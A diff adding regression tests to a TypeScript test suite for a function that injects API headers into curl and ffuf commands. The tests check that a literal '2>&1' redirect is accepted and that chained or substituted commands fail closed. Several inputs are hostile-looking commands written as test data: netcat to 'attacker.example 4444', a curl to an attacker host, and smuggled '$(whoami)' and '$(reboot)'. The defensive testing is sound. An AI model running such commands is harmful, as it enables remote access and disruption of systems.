@@ -397,6 +397,241 @@ describe("applyHeadersToShellCommand", () => {
     // nikto sees the literal two-byte `\n`.
     expect(r.command).toContain("X-One: 1\\\\nX-Two: 2");
   });
+
+  // -- literal `2>&1` descriptor redirect (regression: previously the `&`
+  //    was classified as command chaining, which fail-closed the very
+  //    capture pattern the tool guidance recommends) --
+
+  it("injects into curl carrying a literal 2>&1 stderr merge", () => {
+    const session = makeSession({
+      config: { headers: { "X-API-Key": "abc" } },
+    });
+    const r = applyHeadersToShellCommand(
+      "curl -s https://example.com/api 2>&1",
+      session,
+      ["example.com"],
+    );
+    expect(r.status).toBe("injected");
+    expect(r.tool).toBe("curl");
+    expect(r.command).toContain(`-H "X-API-Key: abc"`);
+    // The merge token must survive byte-for-byte.
+    expect(r.command.endsWith("2>&1")).toBe(true);
+  });
+
+  it("injects when 2>&1 follows a file redirect (tool-guided capture pattern)", () => {
+    const session = makeSession({
+      config: { headers: { "X-API-Key": "abc" } },
+    });
+    const r = applyHeadersToShellCommand(
+      "curl -s https://example.com/ > scratchpad/scan.txt 2>&1",
+      session,
+      ["example.com"],
+    );
+    expect(r.status).toBe("injected");
+    expect(r.command).toContain("> scratchpad/scan.txt 2>&1");
+  });
+
+  it("injects for other registered tools carrying 2>&1", () => {
+    const session = makeSession({
+      config: { headers: { "X-API-Key": "abc" } },
+    });
+    const r = applyHeadersToShellCommand(
+      "ffuf -u https://example.com/FUZZ -w words.txt 2>&1",
+      session,
+      ["example.com"],
+    );
+    expect(r.status).toBe("injected");
+    expect(r.tool).toBe("ffuf");
+  });
+
+  it("injects when 2>&1 appears before the URL", () => {
+    const session = makeSession({
+      config: { headers: { "X-API-Key": "abc" } },
+    });
+    const r = applyHeadersToShellCommand(
+      "curl 2>&1 -s https://example.com/api",
+      session,
+      ["example.com"],
+    );
+    expect(r.status).toBe("injected");
+    expect(r.tool).toBe("curl");
+  });
+
+  it("still treats quoted operator args as injectable alongside 2>&1", () => {
+    const session = makeSession({
+      config: { headers: { "X-API-Key": "abc" } },
+    });
+    for (const cmd of [
+      `curl -H "X-Custom: a|b;c&d" https://example.com/ 2>&1`,
+      // Single quotes make substitution text literal, not live.
+      `curl 'a$(literal)' https://example.com/ 2>&1`,
+    ]) {
+      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
+      expect(r.status).toBe("injected");
+      expect(r.tool).toBe("curl");
+    }
+  });
+
+  it("fails closed when real chaining follows 2>&1", () => {
+    const session = makeSession({
+      config: { headers: { "X-API-Key": "abc" } },
+    });
+    for (const cmd of [
+      "curl -s https://example.com/api 2>&1; whoami",
+      "curl -s https://example.com/api 2>&1 && nc attacker.example 4444",
+      "curl -s https://example.com/api 2>&1 & curl https://attacker.example/x",
+    ]) {
+      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
+      expect(r.status).toBe("unknown-tool");
+      expect(r.tool).toBeNull();
+    }
+  });
+
+  it("fails closed on pipelines that contain 2>&1", () => {
+    const session = makeSession({
+      config: { headers: { "X-API-Key": "abc" } },
+    });
+    const r = applyHeadersToShellCommand(
+      "curl -s https://example.com/api 2>&1 | tee scratchpad/out.txt",
+      session,
+      ["example.com"],
+    );
+    expect(r.status).toBe("unknown-tool");
+  });
+
+  it("fails closed on redirect targets that are not the literal token", () => {
+    const session = makeSession({
+      config: { headers: { "X-API-Key": "abc" } },
+    });
+    for (const cmd of [
+      "curl -s https://example.com/api 2>&$fd",
+      "curl -s https://example.com/api 2>&$(cat scratchpad/fd)",
+      // `1$(…)` extends the target word — POSIX shells expand it, running
+      // the substitution.
+      "curl -s https://example.com/api 2>&1$(reboot)",
+      "curl -s https://example.com/api 2>&12",
+      "curl -s https://example.com/api 2>&1x",
+    ]) {
+      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
+      expect(r.status).toBe("unknown-tool");
+      expect(r.command).toBe(cmd);
+    }
+  });
+
+  it("fails closed when 2>&1 rides a command with multiple hosts, mixed or not", () => {
+    const session = makeSession({
+      config: { headers: { "X-API-Key": "abc" } },
+    });
+    for (const hosts of [
+      ["example.com", "attacker.net"],
+      ["a.example.com", "b.example.com"],
+    ] as const) {
+      const r = applyHeadersToShellCommand(
+        `curl https://${hosts[0]}/a https://${hosts[1]}/b 2>&1`,
+        session,
+        [...hosts],
+      );
+      expect(r.status).toBe("unknown-tool");
+    }
+  });
+
+  it("keeps pre-existing behavior for multi-host commands without 2>&1", () => {
+    // Scope enforcement for the whole command lives in the caller's scope
+    // guard; this layer only fail-closes the new `2>&1` acceptance.
+    const session = makeSession({
+      config: { headers: { "X-API-Key": "abc" } },
+    });
+    const r = applyHeadersToShellCommand(
+      "curl https://example.com/a https://attacker.net/b",
+      session,
+      ["example.com", "attacker.net"],
+    );
+    expect(r.status).toBe("injected");
+  });
+
+  it("fails closed when 2>&1 shares the command with live substitution", () => {
+    const session = makeSession({
+      config: { headers: { "X-API-Key": "abc" } },
+    });
+    for (const cmd of [
+      // Command substitution inside double quotes still executes.
+      `curl "$(printf 'https://example.com')" 2>&1`,
+      "curl -s https://example.com/api `whoami` 2>&1",
+      "curl -s https://example.com/api <(whoami) 2>&1",
+      "curl -s https://example.com/api 2>&1 $(whoami)",
+    ]) {
+      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
+      expect(r.status).toBe("unknown-tool");
+      expect(r.tool).toBeNull();
+    }
+  });
+
+  it("fails closed when 2>&1 rides live parameter expansion", () => {
+    // A `$SECOND_URL` arg expands at runtime to a host no scope check has
+    // verified — extracted hosts still contain only the literal one.
+    const session = makeSession({
+      config: { headers: { "X-API-Key": "abc" } },
+    });
+    for (const cmd of [
+      `curl https://example.com/ "$SECOND_URL" 2>&1`,
+      `curl https://example.com/ \${SECOND_URL} 2>&1`,
+      "curl https://example.com/ $SECOND_URL 2>&1",
+    ]) {
+      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
+      expect(r.status).toBe("unknown-tool");
+      expect(r.tool).toBeNull();
+    }
+  });
+
+  it("accepts 2>&1 with quoted or escaped dollar literals", () => {
+    const session = makeSession({
+      config: { headers: { "X-API-Key": "abc" } },
+    });
+    for (const cmd of [
+      `curl -H 'Cookie: a$literal' https://example.com/ 2>&1`,
+      'curl -H "X-Note: \\$literal" https://example.com/ 2>&1',
+    ]) {
+      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
+      expect(r.status).toBe("injected");
+    }
+  });
+
+  it("fails closed when a second command follows 2>&1 on a new line", () => {
+    const session = makeSession({
+      config: { headers: { "X-API-Key": "abc" } },
+    });
+    const r = applyHeadersToShellCommand(
+      "curl -s https://example.com/api 2>&1\nwhoami",
+      session,
+      ["example.com"],
+    );
+    expect(r.status).toBe("unknown-tool");
+  });
+
+  it("fails closed on quote concatenation onto the 2>&1 target", () => {
+    const session = makeSession({
+      config: { headers: { "X-API-Key": "abc" } },
+    });
+    for (const cmd of [
+      `curl -s https://example.com/api 2>&1"$(whoami)"`,
+      "curl -s https://example.com/api 2>&1'x'",
+    ]) {
+      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
+      expect(r.status).toBe("unknown-tool");
+    }
+  });
+
+  it("injects for multiple URLs on one in-scope host", () => {
+    const session = makeSession({
+      config: { headers: { "X-API-Key": "abc" } },
+    });
+    const r = applyHeadersToShellCommand(
+      "curl https://example.com/a https://example.com/b 2>&1",
+      session,
+      ["example.com"],
+    );
+    expect(r.status).toBe("injected");
+  });
 });
 
 // ---------------------------------------------------------------------------
